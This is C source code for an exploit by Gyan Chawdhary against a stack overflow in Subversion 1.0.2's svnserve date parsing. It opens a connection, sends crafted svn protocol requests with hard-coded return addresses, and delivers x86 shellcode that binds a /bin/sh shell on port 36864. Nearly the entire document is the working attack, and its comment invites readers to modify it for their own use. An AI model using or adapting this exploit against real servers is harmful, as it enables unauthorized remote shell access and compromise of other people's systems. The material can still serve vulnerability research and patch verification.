/* subversion-1.0.2 exploit by Gyan Chawdhary ...
* exploits a stack overflow in the svn_time_from_cstring() function. We build
* a date format which is valid but at the same time exits after the sscanf
* function, or else it branches into another function which segfaults at the
* apr_pool_t *pool. We overwrite our eip with a pointer to the main *data
* buffer stored in the heap where our shell code is stored in the main request
* itself. This is cause the local stack space for svn_time_from_cstring is
* small. Will bind a shell on 36864 port. Modify it for ur own usage.
*
* boring exploit for a boring vulnerability
* Gyan
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>

#define BUF_SIZE ( 1024 * 2 )
#define TRUE 1
#define FALSE 0
#define PORT 3690 /* Default svnserve Port */
#define IP "127.0.0.1"
#define CMD "/bin/uname -a ; id ;\r\n";

struct targets {
char *os;
unsigned int *eip;
unsigned int *shell_nop;
};

/*struct targets TARGETS[] =
{
{ "Redhat 8.0 - (Psyche)",
*/
char offset1[] = "\x78\x32\x06\x08"; // 0x8063278 + 88 + 12;
char offset2[] = "\xdc\x32\x06\x08"; // 0x80632dc

int sockfd;

char request1[] = "( 2 ( edit-pipeline ) %d:%s )\n";

char request2[] = "( ANONYMOUS ( 0: ) )\n";

char request3[] = "( get-dated-rev ( 314:aaaaaaaa%saaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%saaaaaaaa%saaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 4 a tttt 16:24:23.111 (day 277, dst 1, gmt_off -18000) ) )\n";

char request4[] = "( check-path ( 0: ( 0 ) ) )\n";


/* p_types */
void xp_connect(char *);
char *build_request(char *);
void talk(char *, char *);


char shellcode[] =
"\xeb\x72\x5e\x29\xc0\x89\x46\x10\x40\x89\xc3\x89\x46\x0c"
"\x40\x89\x46\x08\x8d\x4e\x08\xb0\x66\xcd\x80\x43\xc6\x46"
"\x10\x10\x66\x89\x5e\x14\x88\x46\x08\x29\xc0\x89\xc2\x89"
"\x46\x18\xb0\x90\x66\x89\x46\x16\x8d\x4e\x14\x89\x4e\x0c"
"\x8d\x4e\x08\xb0\x66\xcd\x80\x89\x5e\x0c\x43\x43\xb0\x66"
"\xcd\x80\x89\x56\x0c\x89\x56\x10\xb0\x66\x43\xcd\x80\x86"
"\xc3\xb0\x3f\x29\xc9\xcd\x80\xb0\x3f\x41\xcd\x80\xb0\x3f"
"\x41\xcd\x80\x88\x56\x07\x89\x76\x0c\x87\xf3\x8d\x4b\x0c"
"\xb0\x0b\xcd\x80\xe8\x89\xff\xff\xff/bin/sh";


void xp_connect(char *ip)
{
// int sockfd;
struct sockaddr_in s;
char buffer[1024];
char temp[1024];
int tmp;

s.sin_family = AF_INET;
s.sin_port = htons(PORT);
s.sin_addr.s_addr = inet_addr(IP);

if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
{
printf("Cannot create socket\n");
exit(-1);
}

if((connect(sockfd,(struct sockaddr *)&s,sizeof(struct sockaddr))) < 0)
{
printf("Cannot connect()\n");
exit(-1);
}
memset(temp, '\0', sizeof(temp));
tmp = recv(sockfd,temp,1024,0);

}

void talk(char *ip, char *repo)
{
char buffer[1024], request[1024], tmp[512];
static char string[] = "svn://%s/%s";
int size;
char *str;

sprintf(buffer, string, ip, repo);
size = strlen(buffer);
sprintf(request, request1, size, buffer);

xp_connect(ip);

if (send(sockfd, request, strlen(request), 0) < 0)
{
printf("send() failed\n");
exit(-1);
}
recv(sockfd, tmp, 512, 0);

if (send(sockfd, request2, strlen(request2), 0) < 0)
{
printf("send() failed\n");
exit(-1);
}
recv(sockfd, tmp, 512, 0);

str = build_request(shellcode);

if(write (sockfd, str, strlen(str)) < 0)
{
printf("write() failed\n");
exit(-1);
}

close(sockfd);
//connect_target();
}



char *build_request(char *sc)
{
char *buffer, *ptr;
buffer = (char *)malloc(1024);
ptr = buffer;
sprintf(ptr, request3, offset1, offset2, sc);

return buffer;
}



main(int argc, char **argv)
{
talk(IP, "cool");
}